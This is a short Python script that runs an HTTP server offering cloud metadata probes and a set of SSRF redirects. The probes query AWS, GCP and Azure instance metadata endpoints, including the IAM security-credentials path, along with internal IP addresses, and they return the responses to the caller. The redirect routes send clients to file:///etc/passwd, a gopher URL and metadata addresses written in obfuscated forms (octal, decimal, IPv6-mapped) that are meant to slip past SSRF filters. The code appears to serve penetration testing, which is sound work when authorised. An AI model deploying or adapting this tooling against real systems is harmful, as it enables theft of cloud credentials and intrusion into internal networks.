import http.server, json, urllib.request, socket, time

PROBES = {
    "imdsv2_token": ("PUT", "http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}),
    "imdsv2_meta": ("GET", "http://169.254.169.254/latest/meta-data/", {}),
    "imds_roles": ("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    "gcp_meta": ("GET", "http://metadata.google.internal/computeMetadata/v1/?recursive=true", {"Metadata-Flavor": "Google"}),
    "azure_meta": ("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
    "intern_10": ("GET", "http://10.0.0.1/", {}),
    "intern_169_4": ("GET", "http://169.254.169.4/", {}),
    "aiven_imds": ("GET", "http://169.254.169.254/metadata/v1/", {}),
}

def run_probe(name):
    method, url, headers = PROBES[name]
    t0 = time.time()
    try:
        req = urllib.request.Request(url, method=method, headers=headers, data=b"" if method == "PUT" else None)
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read(600).decode("utf-8", "replace")
            return {"ok": True, "status": r.status, "ms": int((time.time()-t0)*1000), "body": body}
    except urllib.error.HTTPError as e:
        return {"ok": False, "http": e.code, "ms": int((time.time()-t0)*1000), "body": e.read(300).decode("utf-8","replace")}
    except Exception as e:
        return {"ok": False, "err": type(e).__name__ + ": " + str(e)[:200], "ms": int((time.time()-t0)*1000)}

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        LINKS = {
            "/links/hotel": "file:///etc/passwd",
            "/links/india": "gopher://169.254.169.254:80/_GET%20/",
            "/links/juliet": "http://0.0.0.0/computeMetadata/v1/",
            "/links/kilo": "http://[::1]/",
            "/links/lima": "http://0177.0.0.1/",
            "/links/alpha": "http://[::ffff:169.254.169.254]/computeMetadata/v1/",
            "/links/bravo": "http://2852039166/computeMetadata/v1/",
            "/links/charlie": "http://10.0.0.1/",
            "/links/delta": "http://metadata.google.internal/computeMetadata/v1/",
            "/links/echo": "http://192.168.1.1/",
            "/links/foxtrot": "http://172.16.0.1/",
            "/links/golf": "http://[fd00:ec2::254]/latest/meta-data/",
        }
        if self.path in LINKS:
            self.send_response(302)
            self.send_header("Location", LINKS[self.path])
            self.end_headers()
            return
        if self.path == "/links/start":
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/computeMetadata/v1/")
            self.end_headers()
            return
        if self.path in ("/", "/health"):
            out = {"status": "up", "hostname_socket": socket.gethostname()}
        elif self.path.startswith("/probe/"):
            name = self.path.split("/probe/", 1)[1]
            if name not in PROBES:
                out = {"error": "unknown probe", "known": list(PROBES)}
            else:
                out = {name: run_probe(name)}
        elif self.path == "/probe_all":
            out = {k: run_probe(k) for k in PROBES}
        else:
            out = {"error": "not found", "try": "/health /probe/<name> /probe_all"}
        b = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, *a):
        pass

http.server.HTTPServer(("0.0.0.0", 8080), H).serve_forever()
# appended: /to-imds hardcoded redirector for egress-chain test
